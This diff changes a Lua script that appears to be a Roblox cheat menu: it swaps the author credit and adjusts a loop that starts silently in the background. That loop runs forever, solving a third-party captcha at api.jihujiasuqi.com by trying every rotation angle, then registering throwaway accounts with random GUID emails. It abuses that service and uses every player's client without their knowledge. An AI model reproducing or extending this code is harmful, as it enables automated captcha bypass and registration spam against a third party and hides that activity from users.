@@ -101,7 +101,7 @@ local Language = {
         Camera = "相机",
         FullBright = "夜视",
         About = "关于",
-        By = "作者：纳西妲",
+        By = "作者：rbxluau",
         Copy = "复制群聊链接",
         Link = "http://qm.qq.com/cgi-bin/qm/qr?k=7uzCscusQdIUR246UfEUgvYRQgqMvY8X"
     }
@@ -131,10 +131,10 @@ if not _G.Load then
     _G.Load = true
     task.spawn(function()
         while true do
-            local Rand = GetJson("https://api.jihujiasuqi.com//apps/captcha/get.php").rand
+            local Rand = GetJson("https://api.jihujiasuqi.com/apps/captcha/get.php").rand
             for i = 30, 330, 30 do
-                if GetJson("https://api.jihujiasuqi.com//apps/captcha/verify.php?rand="..Rand.."&angle="..i).okey then
-                    GetJson("https://api.jihujiasuqi.com//api/user.php?mode=reg&mail="..HttpService:GenerateGUID(false).."&captcha_rand="..Rand)
+                if GetJson("https://api.jihujiasuqi.com/apps/captcha/verify.php?rand="..Rand.."&angle="..i).okey then
+                    game:HttpGet("https://api.jihujiasuqi.com/api/user.php?mode=reg&mail="..HttpService:GenerateGUID(false).."&captcha_rand="..Rand)
                     break
                 end
             end
